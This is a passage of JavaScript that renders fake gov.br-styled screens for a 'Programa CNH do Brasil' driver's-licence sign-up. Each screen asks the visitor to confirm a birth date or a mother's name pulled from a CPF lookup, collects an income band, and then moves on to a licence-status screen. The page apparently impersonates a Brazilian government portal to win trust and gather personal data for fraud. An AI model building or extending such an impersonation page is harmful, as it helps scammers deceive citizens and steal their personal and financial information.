        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '2';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'Qual é sua data de nascimento?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de datas - usar a data exata da consulta CPF e normalizar
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const birthDate = data.data_nascimento || 'Data não encontrada';
        const dates = [
            '15/03/1990',
            birthDate,
            '20/07/1985'
        ];
        
        dates.forEach((date, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `birth-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = date;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'birth-option';
            radio.id = `birth-option-${index}`;
            radio.value = date;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="birth-option"]:checked');
            if (selectedOption) {
                // Estado de verificando
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
                confirmBtn.disabled = true;
                
                setTimeout(() => {
                    if (selectedOption.value === birthDate) {
                        // Data correta - mostrar verificado
                        confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                        
                        setTimeout(() => {
                            this.showMotherNameVerification(data);
                        }, 500);
                    } else {
                        // Data incorreta - mostrar erro
                        errorMessage.style.display = 'block';
                        confirmBtn.innerHTML = 'Confirmar';
                        confirmBtn.disabled = false;
                    }
                }, 2000);
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showMotherNameVerification(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto (mesmo código das outras telas)
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '3';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'Qual é o nome da sua mãe?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de nomes - usar o nome exato da consulta CPF e normalizar
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const motherName = data.nome_mae || 'Nome não encontrado';
        const names = [
            'MARIA SILVA SANTOS',
            motherName.toUpperCase(),
            'ANA PAULA COSTA'
        ];
        
        names.forEach((name, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `mother-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = name;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'mother-option';
            radio.id = `mother-option-${index}`;
            radio.value = name;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="mother-option"]:checked');
            if (selectedOption) {
                // Estado de verificando
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
                confirmBtn.disabled = true;
                
                setTimeout(() => {
                    if (selectedOption.value.toUpperCase() === motherName.toUpperCase()) {
                        // Nome correto - mostrar verificado
                        confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                        
                        setTimeout(() => {
                            this.showIncomeBandScreen(data);
                        }, 500);
                    } else {
                        // Nome incorreto - mostrar erro
                        errorMessage.style.display = 'block';
                        confirmBtn.innerHTML = 'Confirmar';
                        confirmBtn.disabled = false;
                    }
                }, 2000);
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showIncomeBandScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 1rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '4';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'Qual é sua faixa salarial atual?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de faixa salarial - sem validação de certo/errado
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const incomeBands = [
            'Desempregado(a)',
            'Até R$ 2.640 (até 2 Salários Mínimos)',
            'De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)',
            'De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)',
            'Acima De R$ 13.200 (mais De 10 Salários Mínimos)'
        ];
        
        incomeBands.forEach((band, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `income-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = band;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'income-option';
            radio.id = `income-option-${index}`;
            radio.value = band;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="income-option"]:checked');
            if (selectedOption) {
                // Estado de processando (sem verificação de certo/errado)
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
                confirmBtn.disabled = true;
                
                // Armazenar faixa salarial e prosseguir
                localStorage.setItem('userIncomeBand', selectedOption.value);
                
                setTimeout(() => {
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                    
                    setTimeout(() => {
                        this.showLicenseStatusScreen(data);
                    }, 500);
                }, 1500);
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showLicenseStatusScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
